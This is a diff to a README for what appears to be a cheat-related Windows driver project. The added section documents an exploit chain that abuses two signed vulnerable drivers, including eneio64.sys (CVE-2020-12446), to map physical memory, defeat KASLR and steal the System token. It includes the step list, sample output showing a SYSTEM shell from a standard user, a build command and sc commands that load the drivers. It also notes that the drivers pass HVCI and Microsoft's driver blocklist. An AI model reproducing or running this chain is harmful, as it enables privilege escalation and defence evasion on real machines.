@@ -121,7 +121,62 @@ Import table is ntoskrnl + the WDF loader stub only. No NDIS/WSK/file/registry
 imports — the driver has no C2 or exfiltration capability; if the parent cheat
 phones home, the user-mode client does it.
 
-## unelevated notes (why this repo is elevated-only)
+## chain_exploit.c — fully unelevated (no SeDebug, no admin)
+
+`chain_exploit.c` chains a second vulnerable driver, **eneio64.sys**
+(CVE-2020-12446, discovered by [@ihack4falafel](https://github.com/ihack4falafel),
+exploit technique by [@Xacone](https://github.com/Xacone/Eneio64-Driver-Exploits),
+sha256 `38c18db050b0b2b07f657c03db1c9595febae0319c746c3eede677e21cd238b0`,
+WHQL-signed via ASUSTeK / ENE Technology, [LOLDrivers entry](https://www.loldrivers.io/drivers/90ecbbf7-b02f-424d-8b7d-56cc9e3b5873/)).
+eneio64 maps **all physical memory** into the calling process via `\\.\GLCKIo`
+(IOCTL `0x80102040`), from a standard user token, in one call. The entry-point
+scan in the low 1MB of physical memory kills KASLR without asking Windows
+anything — no API, no scrub layer, no decoy possible.
+
+Both drivers load under HVCI with no test mode. Neither is in Microsoft's
+vulnerable driver blocklist (verified against the local `driversipolicy.p7b`
+and `VbsSiPolicy.p7b` — hash bytes, filenames, and signer names all absent).
+
+Chain:
+
+1. Open `\\.\GLCKIo` and `\\.\KKYUM` — both from a standard user token
+2. eneio64 maps all 17.5 GB of physical memory into the process
+3. Load `ntoskrnl.exe` file image locally, read the entry point RVA
+4. Scan the low stub (first 1 MB of physical) for a live kernel pointer
+   to that entry — base = pointer − RVA (the Xacone method)
+5. KKYUM reads the export table at that kernel VA → `PsInitialSystemProcess`
+6. Walk `ActiveProcessLinks` to our EPROCESS, swap System's token over ours
+7. Spawn `cmd /k whoami` — **`nt authority\system` from zero privileges**
+8. Restore token after 2s
+
+```
+[*] running as x (elevated=0) - it doesn't matter
+[+] both devices open, standard token [x, elevated=0]
+[*] ntoskrnl entry point b4d3e0
+[*] mapped 44963dfff bytes at 000001D736020000
+[*] found entry ptr fffff805b4dfd3e0 -> base fffff805b42b0000
+[+] nt base fffff805b42b0000
+[+] sysEproc ffffd387356cf040 - Mew
+[+] pid 9716 eprocess -> ffffd38745c9d080 - Mew
+[+] tok ffff950d1959d066 -> ffff950d0d2894f5 - Meow
+[+] SYSTEM cmd [pid 4008].
+[+] Token restored! <3.
+[*] Pop goes the shell.
+```
+
+Build:
+
+```
+x86_64-w64-mingw32-gcc -s -O2 -o chain_exploit.exe chain_exploit.c
+```
+
+Run (load both drivers once from admin, then normal cmd):
+
+```
+sc create KKYUM type= kernel binPath= C:\Windows\Temp\KKYUM.sys && sc start KKYUM
+sc create eneio64 type= kernel binPath= C:\Windows\Temp\eneio64.sys && sc start eneio64
+chain_exploit.exe
+```
 
 On 26100/26200 every classic unelevated kernel-address disclosure is closed
 against a standard user token:
